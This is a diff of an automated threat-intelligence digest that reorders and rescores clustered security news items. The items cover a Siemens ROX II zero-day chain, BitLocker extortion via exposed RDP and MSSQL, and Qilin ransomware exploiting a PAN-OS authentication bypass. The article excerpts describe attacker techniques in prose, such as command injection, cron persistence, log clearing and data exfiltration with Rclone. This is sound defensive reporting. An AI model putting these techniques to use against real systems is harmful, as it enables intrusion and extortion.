@@ -1292,55 +1336,6 @@ Security & Identity Now in preview: Find and fix software vulnerabilities with C
   - Published: 2026-07-17T15:00:11+00:00
   - Link: https://deepmind.google/blog/introducing-gemini-3-5-flash-cyber/
   - Summary: Google introduces Gemini 3.5 Flash Cyber, a lightweight cybersecurity model to find and patch vulnerabilities.
-
-### Cluster d9c1f05e41 — score 18
-
-- Title: Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy
-- Source: Unit 42 (threat_research_primary)
-- Published: 2026-07-17T10:00:24+00:00
-- Link: https://unit42.paloaltonetworks.com/siemens-rox-ii-zero-day-vulnerabilities/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: zero_day
-- affected_industries: critical_infrastructure, manufacturing_industrial
-- affected_products: Palo Alto Networks
-- cve_ids: CVE-2025-40947, CVE-2025-40948, CVE-2025-40949
-- urgency_signals: zero_day
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: zero_day
-- affected_industries: critical_infrastructure, manufacturing_industrial
-- affected_products: Palo Alto Networks
-- cve_ids: CVE-2025-40947, CVE-2025-40948, CVE-2025-40949
-- urgency_signals: zero_day
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-A technical analysis of three chained zero-day vulnerabilities in Siemens ROX II OT switches that allow privilege escalation and persistent root access. The post Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy appeared first on Unit 42 .
-```
-
-#### Full body
-
-```
-Threat Research Center Threat Research Vulnerabilities Vulnerabilities Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy 9 min read Related Products Advanced Threat Prevention Cloud-Delivered Security Services Industrial and Operational Technology IoT Security Next-Generation Firewall By: Emmanuel Zhou Adam Robbie Rick Wyble Miguel Pereira Published: July 17, 2026 Categories: Threat Research Vulnerabilities Tags: Command injection CVE-2025-40947 CVE-2025-40948 CVE-2025-40949 Exploit Chain Privilege escalation Rox II OT switches Share Executive Summary We conducted this research in close partnership with Siemens, reflecting our shared commitment to advancing the security and resilience of critical infrastructure. This report details a critical, chained exploit comprising three zero-day vulnerabilities (CVE-2025-40948, CVE-2025-40947, and CVE-2025-40949) discovered in Siemens ROX II operational technology (OT) switches. Successful exploitation of this chain would allow an attacker to achieve full privilege escalation and persistent root-level access on these devices, which are critical components of industrial control networks. The vulnerabilities range from Medium to Critical severity, with CVSS 3.1 scores of 6.8 (CVE-2025-40948), 7.5 (CVE-2025-40947), and 9.1 (CVE-2025-40949). The attack vector proceeds in three stages, escalating from reconnaissance to complete system compromise: Arbitrary file disclosure ( CVE-2025-40948 ): An attacker leverages an insecure configuration of the xz utility, which executes with root privileges, to read any file on the switch’s file system. This vulnerability enables initial reconnaissance that could reveal critical information such as sensitive configuration files, password hashes and private cryptographic keys. Privilege escalation via command injection ( CVE-2025-40947 ): This critical flaw resides in the feature key validation function. The function fails to sanitize an attacker-controlled payload before inserting it directly into a command executed with root privileges. Exploiting this allows for direct command injection and full root access. Persistent root code execution ( CVE-2025-40949 ): Following privilege escalation, the final vulnerability is exploited in the switch’s web management task scheduler. Improper input sanitization allows an authenticated attacker to inject malicious commands into the system’s root cron table. This establishes persistent code execution, surviving system reboots and maintaining full control. These vulnerabilities could collectively transform a vital network security device into a platform for malicious activity, severely threatening the integrity and availability of the industrial network. Siemens has released security advisories SSA-973901 , SSA-078743 and SSA-081142 to address these issues, which recommend that customers update their affected ROX II devices to firmware version V2.17.1. Palo Alto Networks customers are better protected against these threats through the following products and services: Virtual patching detection signatures available via the Next-Generation Firewall with Advanced Threat Prevention OT Device Security If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics Vulnerabilities , Zero-day , Exploits Partnership Overview The Palo Alto Networks OT Threat Research Lab and Siemens partnered to advance the security and resilience of critical infrastructure through collaborative vulnerability research on the Ruggedcom ROX II platform. We combined the OT Threat Research Lab’s expertise in industrial cybersecurity research with Siemens’ deep product knowledge and the coordination capabilities of Siemens ProductCERT. These teams worked together to identify, validate, remediate and responsibly disclose security vulnerabilities. This collaboration reflects the growing importance of industry partnerships in securing OT environments. As critical inf
-```
-
-#### Corroborating sources (1)
-
-- **Unit 42** (threat_research_primary)
-  - Title: Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy
-  - Published: 2026-07-17T10:00:24+00:00
-  - Link: https://unit42.paloaltonetworks.com/siemens-rox-ii-zero-day-vulnerabilities/
-  - Summary: A technical analysis of three chained zero-day vulnerabilities in Siemens ROX II OT switches that allow privilege escalation and persistent root access. The post Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy appeared first on Unit 42 .
 
 ### Cluster 01f2f6d1a1 — score 17
 
@@ -1426,51 +1421,6 @@ Threat Research Center Threat Research Malware Malware TuxBot v3: Inside an IoT 
   - Link: https://unit42.paloaltonetworks.com/tuxbot-v3-evolution-iot-botnet/
   - Summary: TuxBot v3 Evolution, an IoT botnet framework built with LLMs. Read our analysis of its cross-compiled binaries, C2 architecture and bugs. The post TuxBot v3: Inside an IoT Botnet Framework With LLM-Assisted Development appeared first on Unit 42 .
 
-### Cluster 31d26a81e9 — score 16
-
-- Title: A new extortion cocktail: office printers, small ransoms, and BitLocker
-- Source: Kaspersky Securelist (threat_research_primary)
-- Published: 2026-07-21T13:00:29+00:00
-- Link: https://securelist.com/new-extortion-scheme-printers-bitlocker/120718/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: Microsoft BitLocker
-
-#### Cluster taxonomy (union across members)
-- threat_categories: ransomware_extortion
-- affected_industries: financial_services
-- affected_products: Microsoft BitLocker
-- content_type: incident_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion
-- affected_industries: financial_services
-- affected_products: Microsoft BitLocker
-- content_type: incident_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-We cover two recent cases of BitLocker extortion using RDP, MSSQL, RMM tools, web shells, and printers. The story includes TTPs and recommendations.
-```
-
-#### Full body
-
-```
-Table of Contents Initial sign of an attack First case: abusing RDP to encrypt data Second case: meet the XEntry Team Conclusions Detection signatures Authors Eduardo Ovalle Recently, our teams in Latin America investigated a series of incidents involving misconfiguration, the deployment of BitLocker, and the exploitation of corporate printers. Attackers used the devices to notify organizations that their infrastructure had been compromised and they had to pay a ransom to recover their data. This article analyzes two incidents that occurred in June in Colombia and in May in Mexico. We highlight the similarities in the attackers’ communications and outline emerging trends in ransom amounts. Initial sign of an attack In both cases, the affected users initially noticed a padlock icon next to their drives in Windows Explorer. This indicated that the drive was encrypted with BitLocker, blocking access to its contents. Drive icon indicating that the drive is locked A recovery key was required to unlock the drive. Attempt to access the disk’s contents and the prompt for the BitLocker recovery key This is not the first time we have seen such threats; a few years ago, our team discovered a threat known as ShrinkLocker , which utilized BitLocker to achieve its goals. First case: abusing RDP to encrypt data One of the incidents occurred in Colombia in June. The attackers exploited an internet-exposed RDP service on a machine connected to an 8 TB storage device containing mission-critical data. After taking control of the system and manipulating user credentials, the attackers enabled BitLocker exclusively on the drive that primarily stored financial data. Once the encryption was complete, they locked the drive and used the company’s printers to produce ransom notes. Ransomware note Unfortunately, it was not possible to obtain evidence in the case due to the company’s rush to restore the encrypted disk. The communication with the attackers revealed a demand for just $3,000, and the company considered paying the ransom. After that, the system was restored before the forensic team could take any action, eliminating the evidence needed to assess the incident. Attacker’s reply to the victim’s email sent to the address in the printed ransom note This attack was made possible by an internet-facing remote desktop service (RDP) with additional open ports, which employees used to access corporate information. By exploiting this network exposure and misconfiguration, attackers breached the system, identified an additional drive, and leveraged BitLocker to encrypt the data and demand a ransom payment. Leaving RDP ports open without proper security controls jeopardizes the security of systems and information, as highlighted in the our “ Global Report: Anatomy of a Cyber World “. Exposed ports identified in the system in recent months The company confirmed that, due to compatibility issues with applications required for operation, EPP (Endpoint Protection Platform) protection was disabled on the system, making it easier for attackers to validate, enumerate, and execute applications without revealing malicious activity to central monitoring systems. Second case: meet the XEntry Team In another incident, which occurred in Mexico in May, our team identified how the threat actor gained initial access to the infrastructure. They exploited a misconfigured MSSQL service. This allowed them to execute commands on the system after obtaining the database login credentials from code insecurely published on GitHub. XEntry team attack In this incident, the attack began three months prior to detection, with the intruder discovering and verifying their access to the environment. After confirming their access and privilege level within the MSSQL server settings, which extended beyond the DBMS to the underlying operating system, the attackers initially focused on manipulating certain aspects of the web server configuration on the same system. They lowered the server’s
-```
-
-#### Corroborating sources (1)
-
-- **Kaspersky Securelist** (threat_research_primary)
-  - Title: A new extortion cocktail: office printers, small ransoms, and BitLocker
-  - Published: 2026-07-21T13:00:29+00:00
-  - Link: https://securelist.com/new-extortion-scheme-printers-bitlocker/120718/
-  - Summary: We cover two recent cases of BitLocker extortion using RDP, MSSQL, RMM tools, web shells, and printers. The story includes TTPs and recommendations.
-
 ### Cluster 0e52963d05 — score 16
 
 - Title: Why Exposure Management Is Replacing Vulnerability Management
@@ -1551,60 +1501,6 @@ Back to Blog Threat Research From a Single Alert to 1,000 Files: Inside an Expos
   - Link: https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis
   - Summary: Executive summary An MDR alert recently led our team to an exposed server that was doing more than hosting payloads. It was functioning as a fully operational malware delivery lab. Containing over 1,000 artifacts, the infrastructure served as a QA hub where attackers systematically tested delivery paths, social engineering lures, and WebDAV execution methods. Our analysis reveals an interesting shift in adversary operations: attackers are adopting generative AI to move beyond individual exploits and operate like modern software product teams. By leveraging LLMs for rapid lure generation, detailed README documentation, and automated testing, they are significantly accelerating their development cycle. This incident underscores the imperative of preemptive security. By unifying exposure management with detection and response, we did not just catch a single campaign; we gained visibility into the attacker’s entire delivery pipeline. Although the server hosted many malware samples, the mor
 
-### Cluster 17b63d385b — score 16
-
-- Title: Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Access
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-07-21T14:04:57+00:00
-- Link: https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
-- Fetch status: ok
-- Member count: 2
-- Corroborating source count: 2
-- Strong signals: CVE-2026-0257, Palo Alto Networks
-
-#### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion, zero_day
-- actor_attribution: ShinyHunters
-- affected_products: Microsoft Entra, Palo Alto Networks, Salesforce
-- cve_ids: CVE-2026-0257
-- urgency_signals: poc_available, preauth_unauth, zero_day
-- content_type: incident_report, news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, zero_day
-- actor_attribution: ShinyHunters
-- affected_products: Salesforce, Palo Alto Networks, Microsoft Entra
-- cve_ids: CVE-2026-0257
-- urgency_signals: zero_day, preauth_unauth, poc_available
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Threat actors have been observed exploiting a now-patched high-severity Palo Alto Networks PAN-OS vulnerability as an entry point to deploy Qilin (aka Agenda) ransomware on victim environments. Arctic Wolf Labs said it investigated multiple intrusions in June 2026 that began with the exploitation of CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway
-```
-
-#### Full body
-
-```
-Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Access  Ravie Lakshmanan  Jul 21, 2026 Vulnerability / Network Security Threat actors have been observed exploiting a now-patched high-severity Palo Alto Networks PAN-OS vulnerability as an entry point to deploy Qilin (aka Agenda) ransomware on victim environments. Arctic Wolf Labs said it investigated multiple intrusions in June 2026 that began with the exploitation of CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway components of PAN-OS software. Successful exploitation of the flaw allows unauthenticated remote attackers to sidestep authentication and establish VPN sessions without valid credentials when authentication override cookies are enabled with specific certificate configurations. "Post-exploitation tradecraft varied across intrusions, from rapid encryption-only operations to full double-extortion, possibly suggesting multiple affiliates operating under the Qilin ransomware-as-a-service (RaaS) umbrella," the cybersecurity company said . "Attackers demonstrated consistent operational patterns despite tradecraft variation: staging ransomware at C:\PerfLogs\, using PsExec for lateral execution via administrative shares, deploying password-protected ransomware payloads, and implementing comprehensive log-clearing routines." The threat actors have been found to weaponize the flaw to gain authenticated access to victim networks by establishing SSL VPN sessions, followed by escalating their attacks to facilitate credential harvesting and lateral movement through Windows administrative shares via compromised administrative accounts. The activity is also characterized by the attackers taking deliberate steps to clear event logs and disable Microsoft Defender Real-Time Protection prior to running the ransomware payload so as to minimize the likelihood of detection and avoid leaving forensic evidence. Despite similarities in ransomware staging paths, PsExec-based execution, and an unusual Windows Registry persistence pattern (i.e., an asterisk followed by six randomized lowercase alphabetic characters), follow-on attacks varied across victims. This ranged from enterprise-wide encryption with no data exfiltration and extensive reconnaissance via remote access tools like AnyDesk, Ngrok, or LogMeIn to large-scale credential theft and instances of data exfiltration to the MEGA cloud service before ransomware deployment using Rclone, Proton Drive, and FileZilla. "This variability is consistent with RaaS models, in which multiple affiliates may leverage shared initial access infrastructure and ransomware tooling while applying their own preferred post-exploitation methodologies," Arctic Wolf said. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Cybercrime , endpoint security , enterprise security , network security , ransomware , VPN Security , Vulnerability , Windows Security ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Microsoft-Signed Linux UEFI Shims Could Let Attackers Bypass Secure Boot Researchers Say Claude for Chrome Flaw Lets Rogue Extensions Trigger Gmail Reads Microsoft Patches Record 622 Flaws, Including Two Zero-Days Under Active Attack Cursor Flaw Lets Malicious Cloned Repositories Trigger Windows Code Execution Researcher Drops New Windows Zero-Day PoC Hours After Microsoft
-```
-
-#### Corroborating sources (2)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Access
-  - Published: 2026-07-21T14:04:57+00:00
-  - Link: https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
-  - Summary: Threat actors have been observed exploiting a now-patched high-severity Palo Alto Networks PAN-OS vulnerability as an entry point to deploy Qilin (aka Agenda) ransomware on victim environments. Arctic Wolf Labs said it investigated multiple intrusions in June 2026 that began with the exploitation of CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Critical Palo Alto VPN bug now exploited by Qilin ransomware gang
-  - Published: 2026-07-21T10:12:24+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/critical-globalprotect-vpn-bug-now-exploited-in-ransomware-attacks/
-  - Summary: The Qilin ransomware gang is exploiting a critical PAN-OS GlobalProtect authentication bypass flaw to breach victims' networks, according to cybersecurity company Arctic Wolf. [...]
-
 ### Cluster 3fe79c75d4 — score 16
 
 - Title: Investigating Persistence Mechanisms in AWS
@@ -1612,7 +1508,7 @@ Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Acce
 - Published: 2026-07-15T13:00:00+00:00
 - Link: https://www.rapid7.com/blog/post/dr-investigating-aws-persistence-mechanisms
 - Fetch status: ok
-- Member count: 6
+- Member count: 5
 - Corroborating source count: 3
 - Strong signals: AWS
 
@@ -1709,6 +1605,105 @@ Simon Willison’s Weblog Subscribe Sponsored by: Atlassian — Give your agents
   - Published: 2026-07-15T12:15:17+00:00
   - Link: https://horizon3.ai/news/press-release/horizon3-ai-joins-anthropics-project-glasswing/
   - Summary: Horizon3.ai announces its participation in Anthropic's Project Glasswing, an initiative focused on securing the world’s most critical infrastructure.
+
+### Cluster 31d26a81e9 — score 15
+
+- Title: A new extortion cocktail: office printers, small ransoms, and BitLocker
+- Source: Kaspersky Securelist (threat_research_primary)
+- Published: 2026-07-21T13:00:29+00:00
+- Link: https://securelist.com/new-extortion-scheme-printers-bitlocker/120718/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: Microsoft BitLocker
+
+#### Cluster taxonomy (union across members)
+- threat_categories: ransomware_extortion
+- affected_industries: financial_services
+- affected_products: Microsoft BitLocker
+- content_type: incident_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion
+- affected_industries: financial_services
+- affected_products: Microsoft BitLocker
+- content_type: incident_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+We cover two recent cases of BitLocker extortion using RDP, MSSQL, RMM tools, web shells, and printers. The story includes TTPs and recommendations.
+```
+
+#### Full body
+
+```
+Table of Contents Initial sign of an attack First case: abusing RDP to encrypt data Second case: meet the XEntry Team Conclusions Detection signatures Authors Eduardo Ovalle Recently, our teams in Latin America investigated a series of incidents involving misconfiguration, the deployment of BitLocker, and the exploitation of corporate printers. Attackers used the devices to notify organizations that their infrastructure had been compromised and they had to pay a ransom to recover their data. This article analyzes two incidents that occurred in June in Colombia and in May in Mexico. We highlight the similarities in the attackers’ communications and outline emerging trends in ransom amounts. Initial sign of an attack In both cases, the affected users initially noticed a padlock icon next to their drives in Windows Explorer. This indicated that the drive was encrypted with BitLocker, blocking access to its contents. Drive icon indicating that the drive is locked A recovery key was required to unlock the drive. Attempt to access the disk’s contents and the prompt for the BitLocker recovery key This is not the first time we have seen such threats; a few years ago, our team discovered a threat known as ShrinkLocker , which utilized BitLocker to achieve its goals. First case: abusing RDP to encrypt data One of the incidents occurred in Colombia in June. The attackers exploited an internet-exposed RDP service on a machine connected to an 8 TB storage device containing mission-critical data. After taking control of the system and manipulating user credentials, the attackers enabled BitLocker exclusively on the drive that primarily stored financial data. Once the encryption was complete, they locked the drive and used the company’s printers to produce ransom notes. Ransomware note Unfortunately, it was not possible to obtain evidence in the case due to the company’s rush to restore the encrypted disk. The communication with the attackers revealed a demand for just $3,000, and the company considered paying the ransom. After that, the system was restored before the forensic team could take any action, eliminating the evidence needed to assess the incident. Attacker’s reply to the victim’s email sent to the address in the printed ransom note This attack was made possible by an internet-facing remote desktop service (RDP) with additional open ports, which employees used to access corporate information. By exploiting this network exposure and misconfiguration, attackers breached the system, identified an additional drive, and leveraged BitLocker to encrypt the data and demand a ransom payment. Leaving RDP ports open without proper security controls jeopardizes the security of systems and information, as highlighted in the our “ Global Report: Anatomy of a Cyber World “. Exposed ports identified in the system in recent months The company confirmed that, due to compatibility issues with applications required for operation, EPP (Endpoint Protection Platform) protection was disabled on the system, making it easier for attackers to validate, enumerate, and execute applications without revealing malicious activity to central monitoring systems. Second case: meet the XEntry Team In another incident, which occurred in Mexico in May, our team identified how the threat actor gained initial access to the infrastructure. They exploited a misconfigured MSSQL service. This allowed them to execute commands on the system after obtaining the database login credentials from code insecurely published on GitHub. XEntry team attack In this incident, the attack began three months prior to detection, with the intruder discovering and verifying their access to the environment. After confirming their access and privilege level within the MSSQL server settings, which extended beyond the DBMS to the underlying operating system, the attackers initially focused on manipulating certain aspects of the web server configuration on the same system. They lowered the server’s
+```
+
+#### Corroborating sources (1)
+
+- **Kaspersky Securelist** (threat_research_primary)
+  - Title: A new extortion cocktail: office printers, small ransoms, and BitLocker
+  - Published: 2026-07-21T13:00:29+00:00
+  - Link: https://securelist.com/new-extortion-scheme-printers-bitlocker/120718/
+  - Summary: We cover two recent cases of BitLocker extortion using RDP, MSSQL, RMM tools, web shells, and printers. The story includes TTPs and recommendations.
+
+### Cluster 17b63d385b — score 15
+
+- Title: Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Access
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-07-21T14:04:57+00:00
+- Link: https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
+- Fetch status: ok
+- Member count: 2
+- Corroborating source count: 2
+- Strong signals: CVE-2026-0257, Palo Alto Networks
+
+#### Cluster taxonomy (union across members)
+- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion, zero_day
+- actor_attribution: ShinyHunters
+- affected_products: Microsoft Entra, Palo Alto Networks, Salesforce
+- cve_ids: CVE-2026-0257
+- urgency_signals: poc_available, preauth_unauth, zero_day
+- content_type: incident_report, news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, zero_day
+- actor_attribution: ShinyHunters
+- affected_products: Salesforce, Palo Alto Networks, Microsoft Entra
+- cve_ids: CVE-2026-0257
+- urgency_signals: zero_day, preauth_unauth, poc_available
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Threat actors have been observed exploiting a now-patched high-severity Palo Alto Networks PAN-OS vulnerability as an entry point to deploy Qilin (aka Agenda) ransomware on victim environments. Arctic Wolf Labs said it investigated multiple intrusions in June 2026 that began with the exploitation of CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway
+```
+
+#### Full body
+
+```
+Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Access  Ravie Lakshmanan  Jul 21, 2026 Vulnerability / Network Security Threat actors have been observed exploiting a now-patched high-severity Palo Alto Networks PAN-OS vulnerability as an entry point to deploy Qilin (aka Agenda) ransomware on victim environments. Arctic Wolf Labs said it investigated multiple intrusions in June 2026 that began with the exploitation of CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway components of PAN-OS software. Successful exploitation of the flaw allows unauthenticated remote attackers to sidestep authentication and establish VPN sessions without valid credentials when authentication override cookies are enabled with specific certificate configurations. "Post-exploitation tradecraft varied across intrusions, from rapid encryption-only operations to full double-extortion, possibly suggesting multiple affiliates operating under the Qilin ransomware-as-a-service (RaaS) umbrella," the cybersecurity company said . "Attackers demonstrated consistent operational patterns despite tradecraft variation: staging ransomware at C:\PerfLogs\, using PsExec for lateral execution via administrative shares, deploying password-protected ransomware payloads, and implementing comprehensive log-clearing routines." The threat actors have been found to weaponize the flaw to gain authenticated access to victim networks by establishing SSL VPN sessions, followed by escalating their attacks to facilitate credential harvesting and lateral movement through Windows administrative shares via compromised administrative accounts. The activity is also characterized by the attackers taking deliberate steps to clear event logs and disable Microsoft Defender Real-Time Protection prior to running the ransomware payload so as to minimize the likelihood of detection and avoid leaving forensic evidence. Despite similarities in ransomware staging paths, PsExec-based execution, and an unusual Windows Registry persistence pattern (i.e., an asterisk followed by six randomized lowercase alphabetic characters), follow-on attacks varied across victims. This ranged from enterprise-wide encryption with no data exfiltration and extensive reconnaissance via remote access tools like AnyDesk, Ngrok, or LogMeIn to large-scale credential theft and instances of data exfiltration to the MEGA cloud service before ransomware deployment using Rclone, Proton Drive, and FileZilla. "This variability is consistent with RaaS models, in which multiple affiliates may leverage shared initial access infrastructure and ransomware tooling while applying their own preferred post-exploitation methodologies," Arctic Wolf said. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Cybercrime , endpoint security , enterprise security , network security , ransomware , VPN Security , Vulnerability , Windows Security ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Microsoft-Signed Linux UEFI Shims Could Let Attackers Bypass Secure Boot Researchers Say Claude for Chrome Flaw Lets Rogue Extensions Trigger Gmail Reads Microsoft Patches Record 622 Flaws, Including Two Zero-Days Under Active Attack Cursor Flaw Lets Malicious Cloned Repositories Trigger Windows Code Execution Researcher Drops New Windows Zero-Day PoC Hours After Microsoft
+```
+
+#### Corroborating sources (2)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Access
+  - Published: 2026-07-21T14:04:57+00:00
+  - Link: https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
+  - Summary: Threat actors have been observed exploiting a now-patched high-severity Palo Alto Networks PAN-OS vulnerability as an entry point to deploy Qilin (aka Agenda) ransomware on victim environments. Arctic Wolf Labs said it investigated multiple intrusions in June 2026 that began with the exploitation of CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: Critical Palo Alto VPN bug now exploited by Qilin ransomware gang
+  - Published: 2026-07-21T10:12:24+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/critical-globalprotect-vpn-bug-now-exploited-in-ransomware-attacks/
+  - Summary: The Qilin ransomware gang is exploiting a critical PAN-OS GlobalProtect authentication bypass flaw to breach victims' networks, according to cybersecurity company Arctic Wolf. [...]
 
 ### Cluster 3d70163861 — score 15
 
@@ -2044,39 +2039,6 @@ Threat Intelligence Demystifying AI Exploits: A Blueprint for AI-Assisted Vulner
   - Link: https://cloud.google.com/blog/topics/threat-intelligence/ai-assisted-vulnerability-management/
   - Summary: Written by: Jules Czarniak Introduction As highlighted in the Mandiant M-Trends 2026 report , the mean time-to-exploit (TTE) has dropped to -7 days, meaning vulnerabilities are often exploited a week before a patch even exists. To keep pace, many security teams are exploring how to integrate large language model (LLM) agents into their codebases, development environments and continuous integration and continuous delivery (CI/CD) pipelines for automated vulnerability discovery and remediation. However, deploying privileged artificial intelligence (AI) agents without mature integration processes introduces new architectural risks. In response to customer inquiries about how to safely integrate AI capabilities into vulnerability management workflows, this blog provides actionable guidance from Mandiant Consulting about how to establish operational guardrails for AI assisted vulnerability management, including several detailed scenarios. What each of these examples show is that security te
 
-### Cluster 6e646120d9 — score 11
-
-- Title: Captive Portal Detection, (Tue, Jul 21st)
-- Source: SANS Internet Storm Center (government_authoritative)
-- Published: 2026-07-21T13:44:56+00:00
-- Link: https://isc.sans.edu/diary/rss/33172
-- Fetch status: fetch_failed:HTTPError
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Summary
-
-```
-Not everything our honeypots detect is an attack. Sometimes it is just "odd traffic", and this is one example: Our "First Seen" list currently includes "http://detectportal.firefox.co m/success.txt" as one of the new URLs detected by our honeypots. The hostname "detectportal" kind of gives away what is happening here.
-```
-
-#### Corroborating sources (1)
-
-- **SANS Internet Storm Center** (government_authoritative)
-  - Title: Captive Portal Detection, (Tue, Jul 21st)
-  - Published: 2026-07-21T13:44:56+00:00
-  - Link: https://isc.sans.edu/diary/rss/33172
-  - Summary: Not everything our honeypots detect is an attack. Sometimes it is just "odd traffic", and this is one example: Our "First Seen" list currently includes "http://detectportal.firefox.co m/success.txt" as one of the new URLs detected by our honeypots. The hostname "detectportal" kind of gives away what is happening here.
-
 ### Cluster 8013169017 — score 11
 
 - Title: Risky Bulletin: Hacker wipes Romania's entire land registry database
@@ -2332,6 +2294,39 @@ Table of Contents Introduction Background Initial infection Back connection Laun
   - Published: 2026-07-15T10:00:26+00:00
   - Link: https://securelist.com/okobot-framework-targets-cryptocurrency-wallets/120660/
   - Summary: Kaspersky GReAT experts dissect the new OkoBot campaign targeting cryptocurrency users. This complex framework employs TookPS, exfiltrates seed phrases, monitors Chromium-based browsers, and installs various malware strains, including the Rilide stealer.
+
+### Cluster 6e646120d9 — score 10
+
+- Title: Captive Portal Detection, (Tue, Jul 21st)
+- Source: SANS Internet Storm Center (government_authoritative)
+- Published: 2026-07-21T13:44:56+00:00
+- Link: https://isc.sans.edu/diary/rss/33172
+- Fetch status: fetch_failed:HTTPError
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Summary
+
+```
+Not everything our honeypots detect is an attack. Sometimes it is just "odd traffic", and this is one example: Our "First Seen" list currently includes "http://detectportal.firefox.co m/success.txt" as one of the new URLs detected by our honeypots. The hostname "detectportal" kind of gives away what is happening here.
+```
+
+#### Corroborating sources (1)
+
+- **SANS Internet Storm Center** (government_authoritative)
+  - Title: Captive Portal Detection, (Tue, Jul 21st)
+  - Published: 2026-07-21T13:44:56+00:00
+  - Link: https://isc.sans.edu/diary/rss/33172
+  - Summary: Not everything our honeypots detect is an attack. Sometimes it is just "odd traffic", and this is one example: Our "First Seen" list currently includes "http://detectportal.firefox.co m/success.txt" as one of the new URLs detected by our honeypots. The hostname "detectportal" kind of gives away what is happening here.
 
 ### Cluster 2bab6cab95 — score 10
 
@@ -2804,53 +2799,6 @@ Threat Intelligence The Risk of Exposed Cloud Functions and How to Harden July 1
   - Link: https://cloud.google.com/blog/topics/threat-intelligence/exposed-cloud-functions-harden/
